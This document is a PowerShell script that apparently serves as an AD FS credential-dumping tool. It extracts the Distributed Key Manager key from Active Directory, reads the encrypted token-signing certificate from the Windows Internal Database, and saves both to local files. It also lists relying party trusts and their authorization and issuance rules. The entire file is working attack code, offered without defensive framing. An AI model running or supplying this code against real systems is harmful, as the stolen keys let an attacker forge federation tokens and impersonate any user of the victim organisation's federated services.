# ==========================================
# 1. DKM Key Extraction
# ==========================================
function Get-DKMKey {
    param (
        [string]$domain = ([adsi]"LDAP://RootDSE").defaultNamingContext
    )

    $domainComponents = $domain -split '\.'
    $dcString = ($domainComponents | ForEach-Object { "$_" }) -join ','
    $searchBase = "LDAP://CN=ADFS,CN=Microsoft,CN=Program Data,$dcString"

    try {
        $searcher = New-Object DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]$searchBase
        $searcher.Filter = '(&(objectClass=contact)(!(name=CryptoPolicy)))'
        $searcher.PropertiesToLoad.Add("thumbnailPhoto") | Out-Null
        $results = $searcher.FindAll()

        if ($results) {
            $count = 0
            foreach ($result in $results) {
                if ($result.Properties["thumbnailPhoto"]) {
                    $key = $result.Properties["thumbnailPhoto"][0]
                    $keyString = [System.BitConverter]::ToString($key)
                    
                    Write-Host "[-] Found DKM Key #$count" -ForegroundColor Green
                    Write-Host "    Key: $keyString"
                    
                    $keyString | Out-File -FilePath ".\DKM-$count.txt" -Encoding ASCII -Force
                    [System.IO.File]::WriteAllBytes("$PWD\DKM-$count.bin", $key)
                    $count++
                }
            }
        } else {
            Write-Warning "DKM Key not found."
        }
    } catch {
        Write-Error "Error: $_"
    }
}

# ==========================================
# 2. Database & Config Extraction
# ==========================================

# REMOVED: Install-Module block (Not needed for .NET classes)

$WidConnectionString = "Data Source=np:\\.\pipe\microsoft##wid\tsql\query;Integrated Security=True"
$WidConnectionStringLegacy = "Data Source=np:\\.\pipe\MSSQL$MICROSOFT##SSEE\sql\query"

$ReadEncryptedPfxQuery = "SELECT ServiceSettingsData FROM {0}.IdentityServerPolicy.ServiceSettings"
$ReadScopePolicies = "SELECT SCOPES.ScopeId, SCOPES.Name, SCOPES.WSFederationPassiveEndpoint, SCOPES.Enabled, SCOPES.SignatureAlgorithm, SCOPES.EntityId, SCOPES.EncryptionCertificate, SCOPES.MustEncryptNameId, SCOPES.SamlResponseSignatureType, SCOPES.ParameterInterface, SAML.Binding, SAML.Location, POLICYTEMPLATE.name, POLICYTEMPLATE.PolicyMetadata, POLICYTEMPLATE.InterfaceVersion, SCOPEIDS.IdentityData FROM {0}.IdentityServerPolicy.Scopes SCOPES LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeAssertionConsumerServices SAML ON SCOPES.ScopeId = SAML.ScopeId LEFT OUTER JOIN {0}.IdentityServerPolicy.PolicyTemplates POLICYTEMPLATE ON SCOPES.PolicyTemplateId = POLICYTEMPLATE.PolicyTemplateId LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeIdentities SCOPEIDS ON SCOPES.ScopeId = SCOPEIDS.ScopeId"
$ReadScopePoliciesLegacy = "SELECT SCOPES.ScopeId, SCOPES.Name, SCOPES.WSFederationPassiveEndpoint, SCOPES.Enabled, SCOPES.SignatureAlgorithm, SCOPES.EntityId, SCOPES.EncryptionCertificate, SCOPES.MustEncryptNameId, SCOPES.SamlResponseSignatureType, SAML.Binding, SAML.Location, SCOPEIDS.IdentityData FROM {0}.IdentityServerPolicy.Scopes SCOPES LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeAssertionConsumerServices SAML ON SCOPES.ScopeId = SAML.ScopeId LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeIdentities SCOPEIDS ON SCOPES.ScopeId = SCOPEIDS.ScopeId"
$ReadRules = "SELECT SCOPE.ScopeId, SCOPE.name, POLICIES.PolicyData, POLICIES.PolicyType, POLICIES.PolicyUsage FROM {0}.IdentityServerPolicy.Scopes SCOPE INNER JOIN {0}.IdentityServerPolicy.ScopePolicies SCOPEPOLICIES ON SCOPE.ScopeId = SCOPEPOLICIES.ScopeId INNER JOIN {0}.IdentityServerPolicy.Policies POLICIES ON SCOPEPOLICIES.PolicyId = POLICIES.PolicyId"
$ReadDatabases = "SELECT name FROM sys.databases"
$AdfsConfigTable = "AdfsConfiguration"

# Helper to handle SQL Nulls
function Get-SqlValue {
    param($val)
    if ($val -is [System.DBNull]) { return $null }
    return $val
}

function Get-AdfsVersion {
    param ([System.Data.SqlClient.SqlConnection]$conn)
    $cmd = New-Object System.Data.SqlClient.SqlCommand($ReadDatabases, $conn)
    $reader = $cmd.ExecuteReader()
    while ($reader.Read()) {
        $dbName = $reader["name"]
        if ($dbName -like "*$AdfsConfigTable*") {
            $reader.Close(); return $dbName
        }
    }
    $reader.Close()
    return $null
}

function Read-EncryptedPfx {
    param ([string]$dbName, [System.Data.SqlClient.SqlConnection]$conn)
    $query = $ReadEncryptedPfxQuery -f $dbName
    $cmd = New-Object System.Data.SqlClient.SqlCommand($query, $conn)
    $reader = $cmd.ExecuteReader()
    while ($reader.Read()) {
        $xmlString = $reader["ServiceSettingsData"]
        $xmlDocument = New-Object System.Xml.XmlDocument
        $xmlDocument.LoadXml($xmlString)
        $root = $xmlDocument.DocumentElement
        $signingToken = $root.GetElementsByTagName("SigningToken")[0]
        if ($signingToken) {
            $encryptedPfx = $signingToken.GetElementsByTagName("EncryptedPfx")[0].InnerText
            Write-Host "[-] Encrypted Token Signing Key Found" -ForegroundColor Green
            $encryptedPfx | Out-File -FilePath ".\TKSKey.txt" -Encoding ASCII -Force
            $pfxBytes = [System.Convert]::FromBase64String($encryptedPfx)
            [System.IO.File]::WriteAllBytes("$PWD\TKSKey.bin", $pfxBytes)
            Write-Host "    [+] Saved to TKSKey.txt and TKSKey.bin"
        }
    }
    $reader.Close()
}

function Read-ScopePolicies {
    param ([string]$dbName, [System.Data.SqlClient.SqlConnection]$conn)
    $query = if ($dbName -eq "AdfsConfiguration") { $ReadScopePoliciesLegacy -f $dbName } else { $ReadScopePolicies -f $dbName }
    $cmd = New-Object System.Data.SqlClient.SqlCommand($query, $conn)
    $reader = $cmd.ExecuteReader()
    
    $uniqueScopes = @{}

    while ($reader.Read()) {
        $scopeId = $reader["ScopeId"]
        $name = $reader["Name"]

        if ($name -notmatch "SelfScope|ProxyTrustProvisionRelyingParty|Device Registration Service|UserInfo|PRTUpdateRp|Windows Hello - Certificate Provisioning Service|urn:AppProxy:com") {
            
            # FIX: Handle DBNull correctly using helper
            $wsFed = Get-SqlValue $reader["WSFederationPassiveEndpoint"]
            $samlLoc = Get-SqlValue $reader["Location"]
            
            # Prioritize WSFed, fallback to SAML location
            $currentEndpoint = if ($wsFed) { $wsFed } else { $samlLoc }
            
            if (-not $uniqueScopes.ContainsKey($scopeId)) {
                $uniqueScopes[$scopeId] = [PSCustomObject]@{
                    Name = $name
                    Id = $scopeId
                    IsEnabled = $reader["Enabled"]
                    SignatureAlgorithm = $reader["SignatureAlgorithm"]
                    Identifier = $reader["EntityId"]
                    Identity = $reader["IdentityData"]
                    FederationEndpoint = $currentEndpoint
                    EncryptionCert = $reader["EncryptionCertificate"]
                    SamlResponseSignatureType = $reader["SamlResponseSignatureType"]
                    IsSaml = $samlLoc -ne $null
                    IsWsFed = $wsFed -ne $null
                    IssuanceRules = ""
                }
            } else {
                $existingObj = $uniqueScopes[$scopeId]
                # FIX: Check if existing is empty AND new one is not empty
                if ([string]::IsNullOrWhiteSpace($existingObj.FederationEndpoint) -and -not [string]::IsNullOrWhiteSpace($currentEndpoint)) {
                    $existingObj.FederationEndpoint = $currentEndpoint
                    if ($samlLoc) { $existingObj.IsSaml = $true }
                    if ($wsFed) { $existingObj.IsWsFed = $true }
                }
            }
        }
    }
    $reader.Close()
    return $uniqueScopes.Values
}

function Read-Rules {
    param ([string]$dbName, [System.Data.SqlClient.SqlConnection]$conn, [hashtable]$rps)
    $query = $ReadRules -f $dbName
    $cmd = New-Object System.Data.SqlClient.SqlCommand($query, $conn)
    $reader = $cmd.ExecuteReader()
    while ($reader.Read()) {
        $scopeId = $reader["ScopeId"]
        $rule = $reader["PolicyData"]
        
        if ($rps.ContainsKey($scopeId) -and $rule) {
            $policyType = [int]$reader["PolicyUsage"]
            switch ($policyType) {
                0 { Add-Member -InputObject $rps[$scopeId] -MemberType NoteProperty -Name "StrongAuthRules" -Value $rule -Force }
                1 { Add-Member -InputObject $rps[$scopeId] -MemberType NoteProperty -Name "OnBehalfAuthRules" -Value $rule -Force }
                2 { Add-Member -InputObject $rps[$scopeId] -MemberType NoteProperty -Name "AuthRules" -Value $rule -Force }
                3 { Add-Member -InputObject $rps[$scopeId] -MemberType NoteProperty -Name "IssuanceRules" -Value $rule -Force }
            }
        }
    }
    $reader.Close()
}

function Read-ConfigurationDb {
    param ([hashtable]$arguments)
    $osVersion = [System.Environment]::OSVersion.Version
    $connectionString = if (($osVersion.Major -eq 6 -and $osVersion.Minor -le 1) -or $osVersion.Major -lt 6) { $WidConnectionStringLegacy } else { $WidConnectionString }
    
    try {
        $conn = New-Object System.Data.SqlClient.SqlConnection($connectionString)
        $conn.Open()
    } catch {
        Write-Error "Error connecting to WID database: $_"
        return $null
    }
    
    $dbName = Get-AdfsVersion -conn $conn
    if (-not $dbName) { Write-Error "Error identifying AD FS version"; return $null }
    
    Read-EncryptedPfx -dbName $dbName -conn $conn
    
    $scopeList = Read-ScopePolicies -dbName $dbName -conn $conn
    $rps = @{}
    foreach ($s in $scopeList) { $rps[$s.Id] = $s }
    
    Read-Rules -dbName $dbName -conn $conn -rps $rps
    
    $conn.Close()
    return $rps.Values
}

# ==========================================
# 3. Execution
# ==========================================

Write-Host "`n=== 1. EXTRACTING KEYS ===" -ForegroundColor Cyan
Get-DKMKey

Write-Host "`n=== 2. READING RELYING PARTY TRUSTS ===" -ForegroundColor Cyan
$arguments = @{}
$results = Read-ConfigurationDb -arguments $arguments

# Output formatted results
$results | Format-List
